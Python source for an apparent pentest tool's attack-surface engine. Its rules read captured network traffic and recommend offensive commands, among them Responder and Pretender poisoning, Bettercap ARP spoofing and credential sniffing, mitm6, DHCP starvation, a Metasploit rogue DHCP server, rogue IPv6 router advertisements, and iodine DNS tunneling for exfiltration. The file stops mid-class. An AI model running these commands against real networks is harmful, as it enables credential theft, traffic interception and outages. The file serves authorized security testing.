"""
Attack surface analysis engine — evaluates captured network data
against security testing rules and produces actionable findings.

Each rule inspects passive observations and/or active probe results
to identify opportunities for authorized security testing. Findings
include specific tool commands following the Arsenal pattern.
"""

from __future__ import annotations

import json
import logging
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import StrEnum
from pathlib import Path
from typing import Any

from leetha.store.database import Database

logger = logging.getLogger(__name__)


# Enums

class Severity(StrEnum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class Category(StrEnum):
    NAME_RESOLUTION = "name_resolution"
    LAYER2 = "layer2"
    DHCP = "dhcp"
    ROUTING = "routing"
    SERVICE_EXPLOIT = "service_exploit"
    TLS_CRYPTO = "tls_crypto"
    NETWORK_INTEL = "network_intel"


CATEGORY_LABELS: dict[str, str] = {
    Category.NAME_RESOLUTION: "Name Resolution Poisoning",
    Category.LAYER2: "Layer 2 Attacks",
    Category.DHCP: "DHCP Attacks",
    Category.ROUTING: "Routing Protocol Attacks",
    Category.SERVICE_EXPLOIT: "Service Exploitation",
    Category.TLS_CRYPTO: "TLS / Crypto Weaknesses",
    Category.NETWORK_INTEL: "Network Intelligence",
}


# Data structures

@dataclass
class ToolRecommendation:
    name: str
    command: str
    description: str
    url: str = ""
    install_hint: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class Finding:
    rule_id: str
    name: str
    category: Category
    severity: Severity
    description: str
    affected_devices: list[dict] = field(default_factory=list)
    evidence: list[str] = field(default_factory=list)
    tools: list[ToolRecommendation] = field(default_factory=list)
    chain_ids: list[str] = field(default_factory=list)
    excluded: bool = False
    timestamp: datetime = field(default_factory=datetime.now)

    def to_dict(self) -> dict:
        d = asdict(self)
        d["timestamp"] = self.timestamp.isoformat()
        d["category_label"] = CATEGORY_LABELS.get(self.category, self.category)
        return d


@dataclass
class AttackChain:
    chain_id: str
    name: str
    description: str
    severity: Severity
    steps: list[dict] = field(default_factory=list)
    prerequisite_findings: list[str] = field(default_factory=list)
    tools: list[ToolRecommendation] = field(default_factory=list)
    interface: str = "eth0"
    triggered_by: list[dict] = field(default_factory=list)

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class AnalysisContext:
    devices: list
    observations_by_mac: dict[str, list]
    observations_by_type: dict[str, list]
    probe_results: list[dict]
    probe_by_mac: dict[str, list[dict]]
    probe_by_service: dict[str, list[dict]]
    device_map: dict[str, Any]
    data_dir: Path | None = None
    # Network context for command hydration
    interface: str = "eth0"
    interface_type: str = "local"
    gateway_ip: str | None = None
    domain: str | None = None
    attacker_ip: str | None = None
    dc_ip: str | None = None
    exclusions: list[dict] = field(default_factory=list)


# Context builder

async def _build_context(db: Database, data_dir: Path | None = None,
                         interface: str | None = None,
                         attacker_ip: str | None = None,
                         interface_type: str = "local") -> AnalysisContext:
    devices = await db.list_devices()
    device_map = {d.mac: d for d in devices}

    observations_by_mac: dict[str, list] = {}
    observations_by_type: dict[str, list] = {}
    for device in devices:
        obs_list = await db.get_observations(device.mac, limit=500)
        observations_by_mac[device.mac] = obs_list
        for obs in obs_list:
            observations_by_type.setdefault(obs.source_type, []).append(obs)

    probe_results = await db.list_probe_targets(status="completed")
    probe_by_mac: dict[str, list[dict]] = {}
    probe_by_service: dict[str, list[dict]] = {}
    for p in probe_results:
        probe_by_mac.setdefault(p["mac"], []).append(p)
        if p.get("result"):
            try:
                result = json.loads(p["result"]) if isinstance(p["result"], str) else p["result"]
                svc = result.get("service", "")
                if svc:
                    probe_by_service.setdefault(svc, []).append(p)
            except (json.JSONDecodeError, TypeError, AttributeError):
                pass

    # Derive network context for command hydration
    gateway_ip = None
    dc_ip = None
    for d in devices:
        if d.device_type in ("router", "gateway", "firewall") and d.ip_v4:
            gateway_ip = gateway_ip or d.ip_v4
        # DC detection via Kerberos probe
    for p in probe_results:
        if p.get("result"):
            try:
                r = json.loads(p["result"]) if isinstance(p["result"], str) else p["result"]
                if r.get("service") == "kerberos" and p.get("ip"):
                    dc_ip = dc_ip or p["ip"]
            except (json.JSONDecodeError, TypeError):
                pass

    # Extract domain from internal DNS queries
    domain = None
    for obs in observations_by_type.get("dns", []):
        raw = _parse_raw_data(obs)
        qname = raw.get("query_name", "").lower().rstrip(".")
        for tld in (".local", ".corp", ".internal", ".lan"):
            if qname.endswith(tld):
                parts = qname.split(".")
                if len(parts) >= 2:
                    domain = ".".join(parts[-2:])
                    break
        if domain:
            break

    # Load exclusions
    exclusions = []
    if data_dir:
        exc_file = data_dir / "attack_surface_exclusions.json"
        if exc_file.exists():
            try:
                exc_data = json.loads(exc_file.read_text())
                exclusions = exc_data.get("exclusions", [])
            except (json.JSONDecodeError, OSError):
                pass

    return AnalysisContext(
        devices=devices,
        observations_by_mac=observations_by_mac,
        observations_by_type=observations_by_type,
        probe_results=probe_results,
        probe_by_mac=probe_by_mac,
        probe_by_service=probe_by_service,
        device_map=device_map,
        data_dir=data_dir,
        interface=interface or "eth0",
        interface_type=interface_type,
        gateway_ip=gateway_ip,
        domain=domain,
        attacker_ip=attacker_ip,
        dc_ip=dc_ip,
        exclusions=exclusions,
    )


# Helpers

def _parse_raw_data(obs) -> dict:
    """Parse observation raw_data JSON string to dict."""
    raw = obs.raw_data
    if isinstance(raw, str):
        try:
            return json.loads(raw)
        except (json.JSONDecodeError, TypeError):
            return {}
    return raw if isinstance(raw, dict) else {}


def _device_info(device, extra: dict | None = None) -> dict:
    """Build a device summary dict for findings."""
    info: dict = {
        "mac": device.mac,
        "ip": device.ip_v4 or device.ip_v6,
        "hostname": device.hostname,
    }
    if extra:
        info.update(extra)
    return info


# Passive observation rules

class LLMNRDetectedRule:
    rule_id = "NR-001"
    name = "LLMNR Queries Detected"
    category = Category.NAME_RESOLUTION
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        netbios_obs = ctx.observations_by_type.get("netbios", [])
        affected: dict[str, dict] = {}
        queries: list[str] = []
        for obs in netbios_obs:
            raw = _parse_raw_data(obs)
            if raw.get("query_type") == "llmnr":
                mac = obs.device_mac
                if mac not in affected:
                    dev = ctx.device_map.get(mac)
                    affected[mac] = _device_info(dev) if dev else {"mac": mac}
                qname = raw.get("query_name", "")
                if qname and qname not in queries:
                    queries.append(qname)
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "LLMNR (Link-Local Multicast Name Resolution) queries were detected on "
                "the wire. LLMNR is vulnerable to poisoning attacks — an attacker responds "
                "to broadcast name queries to capture NTLMv2 authentication attempts, which "
                "can then be relayed to other services for authenticated access."
            ),
            affected_devices=list(affected.values()),
            evidence=[
                f"{len(affected)} device(s) sending LLMNR queries",
                f"Queried names: {', '.join(queries[:10])}" if queries else "",
            ],
            tools=[
                ToolRecommendation(
                    name="Responder",
                    command="responder -I {interface} -dwv",
                    description="Poison LLMNR/NBT-NS/mDNS queries to capture NTLMv2 hashes",
                    url="https://github.com/lgandx/Responder",
                    install_hint="apt install responder",
                ),
                ToolRecommendation(
                    name="Inveigh (PowerShell)",
                    command="Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y",
                    description="Windows-native LLMNR/NBNS/mDNS poisoner",
                    url="https://github.com/Kevin-Robertson/Inveigh",
                ),
                ToolRecommendation(
                    name="Pretender",
                    command="pretender -i {interface}",
                    description="Cross-platform Go alternative to Responder — less network disruption, poisons LLMNR/NBT-NS/mDNS by default",
                    url="https://github.com/RedTeamPentesting/pretender",
                ),
            ],
        )]


class NetBIOSDetectedRule:
    rule_id = "NR-002"
    name = "NetBIOS Name Service Queries Detected"
    category = Category.NAME_RESOLUTION
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        netbios_obs = ctx.observations_by_type.get("netbios", [])
        affected: dict[str, dict] = {}
        queries: list[str] = []
        for obs in netbios_obs:
            raw = _parse_raw_data(obs)
            if raw.get("query_type") == "netbios":
                mac = obs.device_mac
                if mac not in affected:
                    dev = ctx.device_map.get(mac)
                    affected[mac] = _device_info(dev) if dev else {"mac": mac}
                qname = raw.get("query_name", "")
                if qname and qname not in queries:
                    queries.append(qname)
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "NetBIOS Name Service (NBT-NS) queries were observed on the wire. NBT-NS "
                "is vulnerable to the same poisoning attacks as LLMNR — an attacker can "
                "respond with a spoofed address to intercept authentication attempts and "
                "relay them to other network services."
            ),
            affected_devices=list(affected.values()),
            evidence=[
                f"{len(affected)} device(s) sending NetBIOS NS queries",
                f"Queried names: {', '.join(queries[:10])}" if queries else "",
            ],
            tools=[
                ToolRecommendation(
                    name="Responder",
                    command="responder -I {interface} -dwv",
                    description="Poison NBT-NS queries to intercept NTLMv2 authentication",
                    url="https://github.com/lgandx/Responder",
                    install_hint="apt install responder",
                ),
                ToolRecommendation(
                    name="Bettercap",
                    command="bettercap -iface {interface} -eval 'set net.sniff.verbose true; net.sniff on'",
                    description="Sniff NBT-NS traffic and observe authentication attempts",
                    url="https://github.com/bettercap/bettercap",
                ),
                ToolRecommendation(
                    name="Pretender",
                    command="pretender -i {interface}",
                    description="Cross-platform Go alternative to Responder — poisons LLMNR/NBT-NS/mDNS by default",
                    url="https://github.com/RedTeamPentesting/pretender",
                ),
            ],
        )]


class MDNSDetectedRule:
    rule_id = "NR-003"
    name = "mDNS Queries Detected"
    category = Category.NAME_RESOLUTION
    severity = Severity.MEDIUM

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        mdns_obs = ctx.observations_by_type.get("mdns", [])
        if not mdns_obs:
            return []
        affected: dict[str, dict] = {}
        services: list[str] = []
        for obs in mdns_obs:
            mac = obs.device_mac
            if mac not in affected:
                dev = ctx.device_map.get(mac)
                affected[mac] = _device_info(dev) if dev else {"mac": mac}
            raw = _parse_raw_data(obs)
            svc = raw.get("service_type", "")
            if svc and svc not in services:
                services.append(svc)
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "mDNS (Multicast DNS) queries were detected. mDNS can be poisoned to "
                "redirect service discovery and intercept connections intended for "
                "legitimate services."
            ),
            affected_devices=list(affected.values()),
            evidence=[
                f"{len(affected)} device(s) using mDNS",
                f"Service types: {', '.join(services[:10])}" if services else "",
            ],
            tools=[
                ToolRecommendation(
                    name="Responder",
                    command="responder -I {interface} -dwv",
                    description="Poison mDNS queries alongside LLMNR/NBT-NS",
                    url="https://github.com/lgandx/Responder",
                ),
                ToolRecommendation(
                    name="Pretender",
                    command="pretender -i {interface}",
                    description="Cross-platform Go alternative to Responder — poisons mDNS/LLMNR/NBT-NS by default",
                    url="https://github.com/RedTeamPentesting/pretender",
                ),
            ],
        )]


class WPADDetectedRule:
    rule_id = "NR-004"
    name = "WPAD Queries Detected"
    category = Category.NAME_RESOLUTION
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        dns_obs = ctx.observations_by_type.get("dns", [])
        netbios_obs = ctx.observations_by_type.get("netbios", [])
        affected: dict[str, dict] = {}
        for obs in dns_obs:
            raw = _parse_raw_data(obs)
            qname = raw.get("query_name", "").lower()
            if "wpad" in qname:
                mac = obs.device_mac
                if mac not in affected:
                    dev = ctx.device_map.get(mac)
                    affected[mac] = _device_info(dev) if dev else {"mac": mac}
        for obs in netbios_obs:
            raw = _parse_raw_data(obs)
            qname = raw.get("query_name", "").upper()
            if "WPAD" in qname:
                mac = obs.device_mac
                if mac not in affected:
                    dev = ctx.device_map.get(mac)
                    affected[mac] = _device_info(dev) if dev else {"mac": mac}
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "WPAD (Web Proxy Auto-Discovery) queries were detected. An attacker can "
                "serve a malicious proxy configuration file to redirect all HTTP traffic "
                "through an attacker-controlled proxy for credential interception."
            ),
            affected_devices=list(affected.values()),
            evidence=[f"{len(affected)} device(s) querying for WPAD"],
            tools=[
                ToolRecommendation(
                    name="Responder (WPAD)",
                    command="responder -I {interface} -wPdv",
                    description="Serve malicious WPAD proxy config to redirect HTTP traffic and force NTLM auth",
                    url="https://github.com/lgandx/Responder",
                ),
                ToolRecommendation(
                    name="mitm6",
                    command="mitm6 -d {domain} -i {interface}",
                    description="IPv6 MITM + WPAD exploitation via DHCPv6 + DNS",
                    url="https://github.com/dirkjanm/mitm6",
                    install_hint="pip install mitm6",
                ),
            ],
        )]


class ARPActivityRule:
    rule_id = "L2-001"
    name = "ARP Traffic Detected"
    category = Category.LAYER2
    severity = Severity.MEDIUM

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        arp_obs = ctx.observations_by_type.get("arp", [])
        if not arp_obs:
            return []
        affected: dict[str, dict] = {}
        for obs in arp_obs:
            mac = obs.device_mac
            if mac not in affected:
                dev = ctx.device_map.get(mac)
                affected[mac] = _device_info(dev) if dev else {"mac": mac}
        if len(affected) < 25:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "ARP traffic was detected between multiple devices. ARP has no authentication "
                "mechanism, making it vulnerable to spoofing attacks that redirect traffic "
                "through an attacker-controlled machine for man-in-the-middle interception."
            ),
            affected_devices=list(affected.values())[:20],
            evidence=[f"{len(affected)} device(s) participating in ARP exchanges"],
            tools=[
                ToolRecommendation(
                    name="Bettercap (ARP Spoof)",
                    command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; net.sniff on'",
                    description="ARP spoofing with integrated traffic sniffing — position as MITM to observe cleartext traffic",
                    url="https://github.com/bettercap/bettercap",
                ),
                ToolRecommendation(
                    name="Bettercap (Full Subnet)",
                    command="bettercap -iface {interface} -eval 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'",
                    description="Full-duplex ARP spoofing for entire subnet — intercept all traffic between hosts",
                    url="https://github.com/bettercap/bettercap",
                ),
            ],
        )]


class ARPDuplicateIPRule:
    rule_id = "L2-002"
    name = "Multiple MACs for Same IP"
    category = Category.LAYER2
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        arp_obs = ctx.observations_by_type.get("arp", [])
        ip_to_macs: dict[str, set[str]] = {}
        for obs in arp_obs:
            # Use src_ip from raw_data first (direct ARP claim), fall back to device table
            raw = _parse_raw_data(obs)
            ip = raw.get("src_ip") if isinstance(raw, dict) else None
            if not ip:
                dev = ctx.device_map.get(obs.device_mac)
                ip = dev.ip_v4 if dev else None
            if not ip or ip == "0.0.0.0":
                continue
            ip_to_macs.setdefault(ip, set()).add(obs.device_mac)
        conflicts = {ip: macs for ip, macs in ip_to_macs.items() if len(macs) > 1}
        if not conflicts:
            return []
        affected = []
        evidence = []
        for ip, macs in conflicts.items():
            evidence.append(f"IP {ip} seen on MACs: {', '.join(sorted(macs))}")
            for mac in macs:
                dev = ctx.device_map.get(mac)
                affected.append(_device_info(dev, {"conflict_ip": ip}) if dev else {"mac": mac, "conflict_ip": ip})
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "The same IP address is associated with multiple MAC addresses. This may "
                "indicate an active ARP spoofing attack, a DHCP misconfiguration, or "
                "device failover."
            ),
            affected_devices=affected[:20],
            evidence=evidence[:10],
            tools=[
                ToolRecommendation(
                    name="arp-scan",
                    command="arp-scan -l -I {interface}",
                    description="Full network ARP scan to verify current IP-MAC bindings and identify conflicts",
                    install_hint="apt install arp-scan",
                ),
                ToolRecommendation(
                    name="Bettercap (ARP Monitor)",
                    command="bettercap -iface {interface} -eval 'net.recon on; net.show; events.stream on'",
                    description="Live network reconnaissance — monitor ARP changes and detect active spoofing",
                    url="https://github.com/bettercap/bettercap",
                ),
            ],
        )]


class GratuitousARPRule:
    rule_id = "L2-003"
    name = "Gratuitous ARP Detected"
    category = Category.LAYER2
    severity = Severity.MEDIUM

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        arp_obs = ctx.observations_by_type.get("arp", [])
        affected: dict[str, dict] = {}
        for obs in arp_obs:
            raw = _parse_raw_data(obs)
            op = raw.get("op")
            dev = ctx.device_map.get(obs.device_mac)
            src_ip = dev.ip_v4 if dev else None
            dst_ip = raw.get("dst_ip") if isinstance(raw, dict) else None
            if op == 2 and src_ip and dst_ip and src_ip == dst_ip:
                mac = obs.device_mac
                if mac not in affected:
                    affected[mac] = _device_info(dev) if dev else {"mac": mac}
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "Gratuitous ARP packets were detected (ARP reply where source and "
                "destination IP are the same). While sometimes legitimate (e.g., failover), "
                "gratuitous ARPs can also indicate ARP cache poisoning attempts."
            ),
            affected_devices=list(affected.values()),
            evidence=[f"{len(affected)} device(s) sending gratuitous ARP"],
            tools=[
                ToolRecommendation(
                    name="Bettercap (ARP Monitor)",
                    command="bettercap -iface {interface} -eval 'net.recon on; events.stream on'",
                    description="Monitor network for ARP anomalies — detect if someone else is already spoofing",
                    url="https://github.com/bettercap/bettercap",
                ),
            ],
        )]


class DHCPStarvationRiskRule:
    rule_id = "DH-001"
    name = "DHCP Activity Detected"
    category = Category.DHCP
    severity = Severity.MEDIUM

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        dhcp_obs = ctx.observations_by_type.get("dhcpv4", [])
        if not dhcp_obs:
            return []
        affected: dict[str, dict] = {}
        for obs in dhcp_obs:
            raw = _parse_raw_data(obs)
            msg_type = raw.get("message_type")
            if msg_type in (1, 3):  # DISCOVER or REQUEST
                mac = obs.device_mac
                if mac not in affected:
                    dev = ctx.device_map.get(mac)
                    affected[mac] = _device_info(dev) if dev else {"mac": mac}
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "DHCP Discover/Request packets were observed. The network uses DHCP for "
                "address assignment, which opens attack vectors including DHCP starvation "
                "(exhausting the address pool) and rogue DHCP server deployment."
            ),
            affected_devices=list(affected.values())[:20],
            evidence=[f"{len(affected)} device(s) requesting DHCP leases"],
            tools=[
                ToolRecommendation(
                    name="Yersinia (DHCP Starvation)",
                    command="yersinia dhcp -attack 1 -interface {interface}",
                    description="Exhaust DHCP address pool with spoofed DISCOVER packets",
                    install_hint="apt install yersinia",
                ),
                ToolRecommendation(
                    name="Metasploit Rogue DHCP",
                    command="msfconsole -x 'use auxiliary/server/dhcp; set SRVHOST {attacker_ip}; set NETMASK 255.255.255.0; set ROUTER {attacker_ip}; set DNSSERVER {attacker_ip}; run'",
                    description="Deploy rogue DHCPv4 server — assign attacker as DNS/gateway for new leases",
                ),
                ToolRecommendation(
                    name="Bettercap (DHCP Sniff)",
                    command="bettercap -iface {interface} -eval 'set net.sniff.filter \"udp port 67 or udp port 68\"; net.sniff on'",
                    description="Monitor DHCP traffic to identify servers and lease details",
                    url="https://github.com/bettercap/bettercap",
                ),
            ],
        )]


class DHCPAnomalyRule:
    rule_id = "DH-002"
    name = "DHCP Anomalies Detected"
    category = Category.DHCP
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        if not ctx.data_dir:
            return []
        anomaly_file = ctx.data_dir / "dhcp_anomalies.jsonl"
        if not anomaly_file.exists():
            return []
        try:
            lines = anomaly_file.read_text().strip().splitlines()
        except OSError:
            return []
        if not lines:
            return []
        anomalies = []
        affected_macs: set[str] = set()
        for line in lines[-50:]:  # last 50 anomalies
            try:
                a = json.loads(line)
                anomalies.append(a)
                if a.get("src_mac"):
                    affected_macs.add(a["src_mac"])
            except json.JSONDecodeError:
                continue
        if not anomalies:
            return []
        affected = []
        for mac in affected_macs:
            dev = ctx.device_map.get(mac)
            affected.append(_device_info(dev) if dev else {"mac": mac})
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "DHCP option anomalies were detected (RFC 2132 violations). This may "
                "indicate a rogue DHCP server, misconfigured infrastructure, or active "
                "DHCP-based attacks on the network."
            ),
            affected_devices=affected[:20],
            evidence=[
                f"{len(anomalies)} anomalies from {len(affected_macs)} device(s)",
                f"Latest: {anomalies[-1].get('reason', 'unknown')}" if anomalies else "",
            ],
            tools=[
                ToolRecommendation(
                    name="dhcpdump",
                    command="dhcpdump -i {interface}",
                    description="Monitor DHCP traffic to identify rogue servers",
                    install_hint="apt install dhcpdump",
                ),
            ],
        )]


class RouterAdvertisementRule:
    rule_id = "RT-001"
    name = "IPv6 Router Advertisements Detected"
    category = Category.ROUTING
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        icmpv6_obs = ctx.observations_by_type.get("icmpv6", [])
        affected: dict[str, dict] = {}
        for obs in icmpv6_obs:
            raw = _parse_raw_data(obs)
            if raw.get("icmpv6_type") == "router_advertisement":
                mac = obs.device_mac
                if mac not in affected:
                    dev = ctx.device_map.get(mac)
                    affected[mac] = _device_info(dev) if dev else {"mac": mac}
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "IPv6 Router Advertisement messages were detected. An attacker can send "
                "rogue RAs to become the default IPv6 gateway, enabling man-in-the-middle "
                "attacks even on IPv4-primary networks."
            ),
            affected_devices=list(affected.values()),
            evidence=[f"{len(affected)} router(s) sending RAs"],
            tools=[
                ToolRecommendation(
                    name="mitm6",
                    command="mitm6 -d {domain} -i {interface}",
                    description="IPv6 MITM via rogue RA + DNS takeover",
                    url="https://github.com/dirkjanm/mitm6",
                    install_hint="pip install mitm6",
                ),
                ToolRecommendation(
                    name="THC-IPv6 fake_router6",
                    command="fake_router6 {interface}",
                    description="Send rogue Router Advertisements to claim default gateway",
                    install_hint="apt install thc-ipv6",
                ),
            ],
        )]


class RoutingProtocolProbeRule:
    rule_id = "RT-002"
    name = "Routing Protocol Services Detected"
    category = Category.ROUTING
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        routing_services = ["hsrp", "vrrp", "bgp", "ospf", "eigrp", "rip"]
        affected: list[dict] = []
        found_services: set[str] = set()
        for svc_name in routing_services:
            for probe in ctx.probe_by_service.get(svc_name, []):
                result = json.loads(probe["result"]) if isinstance(probe.get("result"), str) else {}
                mac = probe["mac"]
                dev = ctx.device_map.get(mac)
                affected.append({
                    **((_device_info(dev) if dev else {"mac": mac})),
                    "port": probe.get("port"),
                    "service": svc_name,
                })
                found_services.add(svc_name)
        if not affected:
            return []
        tools = [
            ToolRecommendation(
                name="Yersinia",
                command="yersinia hsrp -attack 1",
                description="Attack HSRP/VRRP to take over as active router",
                install_hint="apt install yersinia",
            ),
        ]
        if "bgp" in found_services:
            tools.append(ToolRecommendation(
                name="BGP Route Injection",
                command="scapy: send(IP(dst='<peer>')/TCP(dport=179)/BGPHeader()/BGPUpdate(...))",
                description="Inject routes via BGP (requires TCP session)",
            ))
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "Routing protocol services were detected. Compromising routing protocols "
                "like HSRP, VRRP, or BGP can allow traffic interception, route injection, "
                "and network-wide man-in-the-middle attacks."
            ),
            affected_devices=affected,
            evidence=[f"Detected: {', '.join(sorted(found_services))}"],
            tools=tools,
        )]


class TLSWeakVersionRule:
    rule_id = "TC-001"
    name = "Weak TLS Versions Detected"
    category = Category.TLS_CRYPTO
    severity = Severity.MEDIUM

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        tls_obs = ctx.observations_by_type.get("tls", [])
        affected: dict[str, dict] = {}
        for obs in tls_obs:
            raw = _parse_raw_data(obs)
            tls_ver = raw.get("tls_version")
            if tls_ver is not None and isinstance(tls_ver, int) and tls_ver < 0x0303:
                mac = obs.device_mac
                if mac not in affected:
                    dev = ctx.device_map.get(mac)
                    affected[mac] = _device_info(dev) if dev else {"mac": mac}
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "Clients using TLS versions older than 1.2 were detected. Older TLS "
                "versions are vulnerable to POODLE, BEAST, and other protocol downgrade "
                "attacks that can expose encrypted communications."
            ),
            affected_devices=list(affected.values()),
            evidence=[f"{len(affected)} device(s) using TLS < 1.2"],
            tools=[
                ToolRecommendation(
                    name="testssl.sh",
                    command="testssl.sh --protocols {ip}:443",
                    description="Comprehensive TLS/SSL testing including protocol version checks",
                    url="https://github.com/drwetter/testssl.sh",
                    install_hint="apt install testssl.sh",
                ),
                ToolRecommendation(
                    name="SSLyze",
                    command="sslyze {ip}:443",
                    description="Fast TLS scanner for protocol and cipher analysis",
                    install_hint="pip install sslyze",
                ),
            ],
        )]


class HTTPWithoutTLSRule:
    rule_id = "TC-002"
    name = "HTTP Services Without TLS"
    category = Category.TLS_CRYPTO
    severity = Severity.MEDIUM

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        tls_ports = {443, 8443, 4443}
        affected: list[dict] = []
        for probe in ctx.probe_by_service.get("http", []):
            port = probe.get("port", 0)
            if port not in tls_ports:
                result = json.loads(probe["result"]) if isinstance(probe.get("result"), str) else {}
                if not result.get("tls"):
                    mac = probe["mac"]
                    dev = ctx.device_map.get(mac)
                    affected.append({
                        **((_device_info(dev) if dev else {"mac": mac})),
                        "port": port,
                    })
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "HTTP services without TLS encryption were detected by active probing. "
                "Unencrypted HTTP traffic exposes credentials, session tokens, and sensitive "
                "data to any observer on the network — combined with ARP spoofing, all "
                "traffic to these services can be intercepted passively."
            ),
            affected_devices=affected,
            evidence=[f"{len(affected)} HTTP service(s) without TLS"],
            tools=[
                ToolRecommendation(
                    name="Bettercap (HTTP Sniff)",
                    command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.verbose true; set net.sniff.filter \"tcp port 80\"; net.sniff on'",
                    description="ARP spoof target and passively capture HTTP credentials and session tokens",
                    url="https://github.com/bettercap/bettercap",
                ),
                ToolRecommendation(
                    name="mitmproxy",
                    command="mitmproxy --mode transparent --listen-port 8080",
                    description="Interactive MITM proxy for inspecting and modifying HTTP traffic",
                    install_hint="pip install mitmproxy",
                ),
            ],
        )]


class UPnPDetectedRule:
    rule_id = "NI-001"
    name = "UPnP/SSDP Devices Detected"
    category = Category.NETWORK_INTEL
    severity = Severity.LOW

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        ssdp_obs = ctx.observations_by_type.get("ssdp", [])
        if not ssdp_obs:
            return []
        affected: dict[str, dict] = {}
        servers: list[str] = []
        for obs in ssdp_obs:
            mac = obs.device_mac
            if mac not in affected:
                dev = ctx.device_map.get(mac)
                affected[mac] = _device_info(dev) if dev else {"mac": mac}
            raw = _parse_raw_data(obs)
            server = raw.get("server", "")
            if server and server not in servers:
                servers.append(server)
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "UPnP/SSDP-enabled devices were detected. UPnP can expose internal services, "
                "allow port forwarding manipulation, and provide detailed device information "
                "useful for further enumeration."
            ),
            affected_devices=list(affected.values())[:20],
            evidence=[
                f"{len(affected)} UPnP device(s) detected",
                f"Servers: {', '.join(servers[:5])}" if servers else "",
            ],
            tools=[
                ToolRecommendation(
                    name="upnpc",
                    command="upnpc -l",
                    description="List UPnP port mappings and device capabilities",
                    install_hint="apt install miniupnpc",
                ),
                ToolRecommendation(
                    name="Nmap UPnP",
                    command="nmap -sU -p 1900 --script=upnp-info {ip}",
                    description="Enumerate UPnP device details via SSDP",
                    install_hint="apt install nmap",
                ),
            ],
        )]


class InternalDNSQueriesRule:
    rule_id = "NI-002"
    name = "Internal DNS Queries Detected"
    category = Category.NETWORK_INTEL
    severity = Severity.LOW

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        dns_obs = ctx.observations_by_type.get("dns", [])
        internal_tlds = (".local", ".internal", ".corp", ".lan", ".home", ".intranet")
        affected: dict[str, dict] = {}
        domains: list[str] = []
        for obs in dns_obs:
            raw = _parse_raw_data(obs)
            qname = raw.get("query_name", "").lower().rstrip(".")
            if any(qname.endswith(tld) for tld in internal_tlds):
                mac = obs.device_mac
                if mac not in affected:
                    dev = ctx.device_map.get(mac)
                    affected[mac] = _device_info(dev) if dev else {"mac": mac}
                if qname not in domains:
                    domains.append(qname)
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "DNS queries for internal domain names were detected. This reveals internal "
                "naming conventions and infrastructure topology. Internal DNS can also be "
                "tunneled for data exfiltration."
            ),
            affected_devices=list(affected.values())[:20],
            evidence=[
                f"{len(domains)} internal domain(s) queried",
                f"Domains: {', '.join(domains[:10])}" if domains else "",
            ],
            tools=[
                ToolRecommendation(
                    name="dnsrecon",
                    command="dnsrecon -d {domain} -t std,axfr",
                    description="DNS enumeration and zone transfer testing",
                    install_hint="apt install dnsrecon",
                ),
                ToolRecommendation(
                    name="dig (Zone Transfer)",
                    command="dig axfr {domain} @{dc_ip}",
                    description="Attempt DNS zone transfer to dump all records",
                    install_hint="apt install dnsutils",
                ),
                ToolRecommendation(
                    name="iodine (DNS Tunneling)",
                    command="iodine -f {dc_ip} tunnel.{domain}",
                    description="DNS tunneling for data exfiltration testing",
                    url="https://github.com/yarrick/iodine",
                    install_hint="apt install iodine",
                ),
            ],
        )]


class MultipleGatewaysRule:
    rule_id = "NI-003"
